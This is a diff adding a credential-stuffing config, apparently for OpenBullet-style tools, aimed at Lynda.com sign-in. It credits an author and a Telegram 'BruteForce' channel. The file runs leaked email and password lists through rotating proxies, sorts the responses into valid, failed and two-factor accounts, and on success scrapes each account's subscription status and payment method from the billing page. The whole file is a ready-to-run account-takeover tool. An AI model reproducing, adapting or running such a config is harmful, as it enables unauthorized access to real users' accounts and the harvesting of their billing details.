@@ -1,0 +1,118 @@
+[SETTINGS]
+{
+  "Name": "Lynda.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-10T15:43:01.7378648+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Capture | Fast | Move Free To Custom",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_TOK REQUEST GET "https://www.lynda.com/signin/lynda" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#T1 PARSE "<SOURCE>" LR "name=\"-_-\" value=\"" "\" />" -> VAR "T1" 
+
+#POST_U REQUEST POST "https://www.lynda.com/ajax/signin/password" 
+  CONTENT "-_-=<T1>&email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "-_-: <T1>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we do not recognize that email or username." 
+  KEYCHAIN Success OR 
+    KEY "Welcome back! Please sign in" 
+
+#POST_P REQUEST POST "https://www.lynda.com/ajax/signin/user" 
+  CONTENT "-_-=<T1>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://www.lynda.com/signin/password" 
+  HEADER "Origin: https://www.lynda.com" 
+  HEADER "-_-: <T1>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The username or password is invalid." 
+  KEYCHAIN Success OR 
+    KEY "UserID" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "https://www.lynda.com/plans/renewal/select?banner=welcomeback\\u0026initialLogin=1" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "\"/upgrade/completed" 
+    KEY "https://www.lynda.com/login/sso-redirect" 
+    KEY "https://www.lynda.com/IP-Login/Error?ipOutOfRange=true" 
+
+#CAP REQUEST GET "https://www.lynda.com/home/userAccount/AccountBilling.aspx" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referee: https://www.lynda.com/signin/password" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#SSS PARSE "<SOURCE>" LR "<label>Status</label>" "</p>" -> VAR "SSS" 
+
+#Status PARSE "<SSS>" LR "<p>" "" CreateEmpty=FALSE -> CAP "Status" 
+
+#Sub PARSE "<SOURCE>" LR "                    <p>" "</p>" -> CAP "Subsctiption Type" 
+
+#SUB2 PARSE "<SOURCE>" LR "<p>Subscription" "</p>" -> CAP "Subscription Attributes" 
+
+#Payment_method PARSE "<SOURCE>" LR "<strong><span id=\"panel_cc_name\">" "</span></strong>" CreateEmpty=FALSE -> CAP "Payment method" 
+
